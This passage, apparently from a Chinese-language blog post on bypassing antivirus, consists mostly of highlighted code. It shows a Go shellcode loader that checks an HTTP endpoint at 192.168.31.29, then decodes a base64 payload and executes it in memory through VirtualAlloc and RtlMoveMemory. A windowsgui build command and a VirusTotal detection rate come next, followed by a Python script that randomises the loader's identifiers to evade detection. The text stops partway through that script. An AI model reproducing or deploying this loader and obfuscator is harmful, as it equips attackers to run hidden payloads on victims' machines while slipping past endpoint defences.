&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">syscall&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Syscall&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">addr&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">func&lt;/span> &lt;span style="color:#75af00">main&lt;/span>&lt;span style="color:#111">()&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">u&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">_&lt;/span> &lt;span style="color:#f92672">:=&lt;/span> &lt;span style="color:#75af00">url&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Parse&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;http://192.168.31.29/pay&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">q&lt;/span> &lt;span style="color:#f92672">:=&lt;/span> &lt;span style="color:#75af00">u&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Query&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">u&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">RawQuery&lt;/span> &lt;span style="color:#111">=&lt;/span> &lt;span style="color:#75af00">q&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Encode&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">res&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">err&lt;/span> &lt;span style="color:#f92672">:=&lt;/span> &lt;span style="color:#75af00">http&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Get&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">u&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">String&lt;/span>&lt;span style="color:#111">())&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#75af00">err&lt;/span> &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#00a8c8">nil&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">resCode&lt;/span> &lt;span style="color:#f92672">:=&lt;/span> &lt;span style="color:#75af00">res&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">StatusCode&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">res&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Body&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Close&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#75af00">err&lt;/span> &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#00a8c8">nil&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">y&lt;/span> &lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#111">=&lt;/span> &lt;span style="color:#ae81ff">200&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#75af00">resCode&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#75af00">y&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">build&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#75715e">// b64 payload here
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>go build -trimpath -ldflags&lt;span style="color:#f92672">=&lt;/span>-H&lt;span style="color:#f92672">=&lt;/span>windowsgui main.go
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>查杀结果是&lt;a href="https://www.virustotal.com/gui/file/e35be096802a6f11ecc33722d47f872fe3aeb9612aec5b29ee04d099c0e46241">12/68&lt;/a>，可以再对go脚本进行混淆处理&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">random&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#author: pureqh&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#github: https://github.com/pureqh/bypassAV&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#use: python build.py&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">exp&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;&amp;#39;&amp;#39;package main
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">import (
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200"> &amp;#34;encoding/base64&amp;#34;
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200"> &amp;#34;strings&amp;#34;
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200"> &amp;#34;syscall&amp;#34;
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200"> &amp;#34;unsafe&amp;#34;
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200"> &amp;#34;net/http&amp;#34;
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200"> &amp;#34;net/url&amp;#34;
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">)
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">var (
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200"> &lt;/span>&lt;span style="color:#d88200">{2}&lt;/span>&lt;span style="color:#d88200"> = syscall.NewLazyDLL(&amp;#34;kernel32.dll&amp;#34;)
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200"> &lt;/span>&lt;span style="color:#d88200">{3}&lt;/span>&lt;span style="color:#d88200"> = &lt;/span>&lt;span style="color:#d88200">{2}&lt;/span>&lt;span style="color:#d88200">.NewProc(&amp;#34;VirtualAlloc&amp;#34;)
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200"> &lt;/span>&lt;span style="color:#d88200">{4}&lt;/span>&lt;span style="color:#d88200"> = &lt;/span>&lt;span style="color:#d88200">{2}&lt;/span>&lt;span style="color:#d88200">.NewProc(&amp;#34;RtlMoveMemory&amp;#34;)
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">)
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">func &lt;/span>&lt;span style="color:#d88200">{5}&lt;/span>&lt;span style="color:#d88200">(&lt;/span>&lt;span style="color:#d88200">{6}&lt;/span>&lt;span style="color:#d88200"> string)&lt;/span>&lt;span style="color:#d88200">{0}&lt;/span>&lt;span style="color:#d88200">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200"> &lt;/span>&lt;span style="color:#d88200">{7}&lt;/span>&lt;span style="color:#d88200"> :=strings.Replace(&lt;/span>&lt;span style="color:#d88200">{6}&lt;/span>&lt;span style="color:#d88200">, &amp;#34;#&amp;#34;, &amp;#34;A&amp;#34;, -1 )
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200"> &lt;/span>&lt;span style="color:#d88200">{8}&lt;/span>&lt;span style="color:#d88200"> :=strings.Replace(&lt;/span>&lt;span style="color:#d88200">{7}&lt;/span>&lt;span style="color:#d88200">, &amp;#34;!&amp;#34;, &amp;#34;H&amp;#34;, -1 )
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200"> &lt;/span>&lt;span style="color:#d88200">{9}&lt;/span>&lt;span style="color:#d88200"> :=strings.Replace(&lt;/span>&lt;span style="color:#d88200">{8}&lt;/span>&lt;span style="color:#d88200">, &amp;#34;@&amp;#34;, &amp;#34;1&amp;#34;, -1 )
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200"> &lt;/span>&lt;span style="color:#d88200">{10}&lt;/span>&lt;span style="color:#d88200"> :=strings.Replace(&lt;/span>&lt;span style="color:#d88200">{9}&lt;/span>&lt;span style="color:#d88200">, &amp;#34;)&amp;#34;, &amp;#34;T&amp;#34;, -1 )
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200"> &lt;/span>&lt;span style="color:#d88200">{11}&lt;/span>&lt;span style="color:#d88200">,_ := base64.StdEncoding.DecodeString(&lt;/span>&lt;span style="color:#d88200">{10}&lt;/span>&lt;span style="color:#d88200">)
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200"> &lt;/span>&lt;span style="color:#d88200">{12}&lt;/span>&lt;span style="color:#d88200">, _, _ := &lt;/span>&lt;span style="color:#d88200">{3}&lt;/span>&lt;span style="color:#d88200">.Call(0, uintptr(len(&lt;/span>&lt;span style="color:#d88200">{11}&lt;/span>&lt;span style="color:#d88200">)), 0x1000|0x2000, 0x40)
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200"> _, _, _ = &lt;/span>&lt;span style="color:#d88200">{4}&lt;/span>&lt;span style="color:#d88200">.Call(&lt;/span>&lt;span style="color:#d88200">{12}&lt;/span>&lt;span style="color:#d88200">, (uintptr)(unsafe.Pointer(&amp;amp;&lt;/span>&lt;span style="color:#d88200">{11}&lt;/span>&lt;span style="color:#d88200">[0])), uintptr(len(&lt;/span>&lt;span style="color:#d88200">{11}&lt;/span>&lt;span style="color:#d88200">)))
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200"> syscall.Syscall(&lt;/span>&lt;span style="color:#d88200">{12}&lt;/span>&lt;span style="color:#d88200">, 0, 0, 0, 0)
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">&lt;/span>&lt;span style="color:#d88200">{1}&lt;/span>&lt;span style="color:#d88200">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">func main() &lt;/span>&lt;span style="color:#d88200">{0}&lt;/span>&lt;span style="color:#d88200">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200"> &lt;/span>&lt;span style="color:#d88200">{14}&lt;/span>&lt;span style="color:#d88200">, _ := url.Parse(&amp;#34;http://192.168.31.29/pay&amp;#34;)
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200"> &lt;/span>&lt;span style="color:#d88200">{15}&lt;/span>&lt;span style="color:#d88200"> := &lt;/span>&lt;span style="color:#d88200">{14}&lt;/span>&lt;span style="color:#d88200">.Query()
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200"> &lt;/span>&lt;span style="color:#d88200">{14}&lt;/span>&lt;span style="color:#d88200">.RawQuery = &lt;/span>&lt;span style="color:#d88200">{15}&lt;/span>&lt;span style="color:#d88200">.Encode()
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200"> &lt;/span>&lt;span style="color:#d88200">{16}&lt;/span>&lt;span style="color:#d88200">, &lt;/span>&lt;span style="color:#d88200">{18}&lt;/span>&lt;span style="color:#d88200"> := http.Get(&lt;/span>&lt;span style="color:#d88200">{14}&lt;/span>&lt;span style="color:#d88200">.String())
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200"> if &lt;/span>&lt;span style="color:#d88200">{18}&lt;/span>&lt;span style="color:#d88200"> != nil &lt;/span>&lt;span style="color:#d88200">{0}&lt;/span>&lt;span style="color:#d88200">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200"> return
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200"> &lt;/span>&lt;span style="color:#d88200">{1}&lt;/span>&lt;span style="color:#d88200">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200"> &lt;/span>&lt;span style="color:#d88200">{13}&lt;/span>&lt;span style="color:#d88200"> := &lt;/span>&lt;span style="color:#d88200">{16}&lt;/span>&lt;span style="color:#d88200">.StatusCode
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200"> &lt;/span>&lt;span style="color:#d88200">{16}&lt;/span>&lt;span style="color:#d88200">.Body.Close()
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200"> if &lt;/span>&lt;span style="color:#d88200">{18}&lt;/span>&lt;span style="color:#d88200"> != nil &lt;/span>&lt;span style="color:#d88200">{0}&lt;/span>&lt;span style="color:#d88200">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200"> return
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200"> &lt;/span>&lt;span style="color:#d88200">{1}&lt;/span>&lt;span style="color:#d88200">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200"> var &lt;/span>&lt;span style="color:#d88200">{17}&lt;/span>&lt;span style="color:#d88200"> int = 200
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200"> if &lt;/span>&lt;span style="color:#d88200">{13}&lt;/span>&lt;span style="color:#d88200"> == &lt;/span>&lt;span style="color:#d88200">{17}&lt;/span>&lt;span style="color:#d88200"> &lt;/span>&lt;span style="color:#d88200">{0}&lt;/span>&lt;span style="color:#d88200">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200"> &lt;/span>&lt;span style="color:#d88200">{5}&lt;/span>&lt;span style="color:#d88200">(&amp;#34;&amp;#34;) // b64 payload here
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200"> &lt;/span>&lt;span style="color:#d88200">{1}&lt;/span>&lt;span style="color:#d88200">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">&lt;/span>&lt;span style="color:#d88200">{1}&lt;/span>&lt;span style="color:#d88200">&amp;#39;&amp;#39;&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">random_name&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">len&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">str&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;ABCDEFGHIJKLMNOPQRSTUVWXYZ&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#d88200">&amp;#39;&amp;#39;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">join&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">random&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">sample&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">str&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#111">len&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">build_AV&lt;/span>&lt;span style="color:#111">():&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">lef&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;&amp;#39;&amp;#39;{&amp;#39;&amp;#39;&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">rig&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;&amp;#39;&amp;#39;}&amp;#39;&amp;#39;&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">var1&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">random_name&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">random&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">randint&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">3&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">9&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">var2&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">random_name&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">random&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">randint&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">3&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">9&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">var3&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">random_name&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">random&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">randint&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">3&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">9&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">fun1&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">random_name&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">random&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">randint&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">3&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">9&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">var4&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">random_name&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">random&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">randint&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">3&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">9&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">var5&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">random_name&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">random&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">randint&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">3&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">9&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">var6&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">random_name&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">random&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">randint&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">3&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">9&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">var7&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">random_name&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">random&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">randint&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">3&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">9&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">var8&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">random_name&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">random&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">randint&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">3&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">9&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">var9&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">random_name&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">random&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">randint&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">3&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">9&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">var10&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">random_name&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">random&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">randint&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">3&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">9&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">var11&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">random_name&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">random&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">randint&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">3&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">9&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">var12&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">random_name&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">random&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">randint&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">3&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">9&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">var13&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">random_name&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">random&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">randint&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">3&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">9&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">var14&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">random_name&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">random&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">randint&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">3&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">9&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">var15&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">random_name&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">random&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">randint&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">3&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">9&lt;/span>&lt;span style="color:#111">))&lt;/span>
